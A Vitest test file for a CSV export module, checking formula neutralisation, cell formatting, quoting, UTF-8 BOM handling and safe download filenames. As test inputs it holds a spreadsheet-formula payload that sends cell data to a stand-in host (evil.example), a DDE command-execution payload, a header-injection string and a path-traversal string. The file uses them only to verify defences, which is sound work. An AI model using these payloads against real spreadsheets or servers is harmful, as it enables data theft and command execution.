import { describe, expect, it } from "vitest";
import {
  formatCell,
  neutraliseFormula,
  safeFilename,
  toCsv,
  toCsvCell,
  type ExportColumn,
} from "./export";

describe("neutraliseFormula", () => {
  // Each of these is executed by Excel/Sheets/LibreOffice on open.
  it.each(["=", "+", "-", "@", "\t", "\r"])("prefixes a value starting with %j", (prefix) => {
    expect(neutraliseFormula(`${prefix}cmd()`)).toBe(`'${prefix}cmd()`);
  });

  it("neutralises the classic exfiltration payload", () => {
    const payload = '=HYPERLINK("https://evil.example?d="&A1,"Click")';
    expect(neutraliseFormula(payload)).toBe(`'${payload}`);
  });

  it("neutralises DDE command execution", () => {
    expect(neutraliseFormula("=cmd|'/c calc'!A1")).toBe("'=cmd|'/c calc'!A1");
  });

  it("leaves ordinary values untouched", () => {
    expect(neutraliseFormula("Ahmed Khan")).toBe("Ahmed Khan");
    expect(neutraliseFormula("1000")).toBe("1000");
  });

  // Preserved, not stripped: an export that silently drops "-5" would be
  // worse than the injection it prevents.
  it("preserves the value, only prefixing it", () => {
    expect(neutraliseFormula("-5")).toBe("'-5");
    expect(neutraliseFormula("-5").slice(1)).toBe("-5");
  });

  it("only inspects the first character", () => {
    expect(neutraliseFormula("a=b+c")).toBe("a=b+c");
  });

  it("handles an empty string", () => {
    expect(neutraliseFormula("")).toBe("");
  });
});

describe("formatCell", () => {
  it("renders blanks for null and undefined", () => {
    expect(formatCell(null)).toBe("");
    expect(formatCell(undefined)).toBe("");
  });

  it("renders dates as ISO, avoiding dd/mm vs mm/dd ambiguity", () => {
    expect(formatCell(new Date("2026-03-04T22:00:00Z"))).toBe("2026-03-04");
  });

  it("renders booleans as Yes/No", () => {
    expect(formatCell(true)).toBe("Yes");
    expect(formatCell(false)).toBe("No");
  });

  it("keeps zero rather than treating it as blank", () => {
    expect(formatCell(0)).toBe("0");
  });
});

describe("toCsvCell", () => {
  it("quotes values containing a comma", () => {
    expect(toCsvCell("Riyadh, Saudi Arabia")).toBe('"Riyadh, Saudi Arabia"');
  });

  it("doubles embedded quotes", () => {
    expect(toCsvCell('He said "hello"')).toBe('"He said ""hello"""');
  });

  it.each([
    ["newline", "line1\nline2"],
    ["carriage return + newline", "line1\r\nline2"],
  ])("quotes values containing a %s", (_label, input) => {
    expect(toCsvCell(input).startsWith('"')).toBe(true);
  });

  // Order matters: neutralising after quoting would put the apostrophe
  // outside the quotes and change the value.
  it("neutralises formulas before quoting, not after", () => {
    expect(toCsvCell('=SUM(A1,A2)')).toBe(`"'=SUM(A1,A2)"`);
  });

  it("leaves a plain value unquoted", () => {
    expect(toCsvCell("Ahmed")).toBe("Ahmed");
  });
});

describe("toCsv", () => {
  type Row = { name: string; salary: number | null };
  const columns: ExportColumn<Row>[] = [
    { key: "name", header: "Name", value: (r) => r.name },
    { key: "salary", header: "Basic Salary", value: (r) => r.salary },
  ];

  it("writes a header row followed by data rows", () => {
    const csv = toCsv(columns, [{ name: "Ahmed", salary: 1000 }]);
    const lines = csv.replace(/^﻿/, "").trimEnd().split("\r\n");
    expect(lines[0]).toBe("Name,Basic Salary");
    expect(lines[1]).toBe("Ahmed,1000");
  });

  // Without the BOM, Excel reads the file as the system codepage and every
  // Arabic name comes out as mojibake.
  it("starts with a UTF-8 BOM so Excel reads Arabic correctly", () => {
    expect(toCsv(columns, []).startsWith("﻿")).toBe(true);
  });

  it("uses CRLF line endings", () => {
    expect(toCsv(columns, [{ name: "A", salary: 1 }])).toContain("\r\n");
  });

  it("writes only the header when there are no rows", () => {
    expect(toCsv(columns, []).replace(/^﻿/, "")).toBe("Name,Basic Salary\r\n");
  });

  it("neutralises an injected value in a data cell", () => {
    const csv = toCsv(columns, [{ name: '=cmd|"/c calc"!A1', salary: null }]);
    expect(csv).toContain("'=cmd");
  });

  // A column omitted for permission reasons must not leave a gap that shifts
  // every later column.
  it("keeps column count consistent when a value is null", () => {
    const csv = toCsv(columns, [{ name: "Ahmed", salary: null }]);
    const dataLine = csv.replace(/^﻿/, "").trimEnd().split("\r\n")[1];
    expect(dataLine).toBe("Ahmed,");
  });
});

describe("safeFilename", () => {
  it("keeps a normal name and adds the extension", () => {
    expect(safeFilename("Employee Directory", "csv")).toBe("Employee-Directory.csv");
  });

  // CR/LF in a Content-Disposition value is header injection.
  it("strips CR and LF", () => {
    const name = safeFilename("a\r\nSet-Cookie: x=1", "csv");
    expect(name).not.toContain("\r");
    expect(name).not.toContain("\n");
  });

  it("strips path separators and traversal", () => {
    const name = safeFilename("../../etc/passwd", "csv");
    expect(name).not.toContain("/");
    expect(name).not.toContain("..");
  });

  it("strips quotes, which would end the header value early", () => {
    expect(safeFilename('a"b', "csv")).toBe("ab.csv");
  });

  it("falls back rather than producing a bare extension", () => {
    expect(safeFilename("!!!", "csv")).toBe("report.csv");
  });

  it("bounds the length", () => {
    expect(safeFilename("a".repeat(500), "csv").length).toBeLessThanOrEqual(84);
  });
});
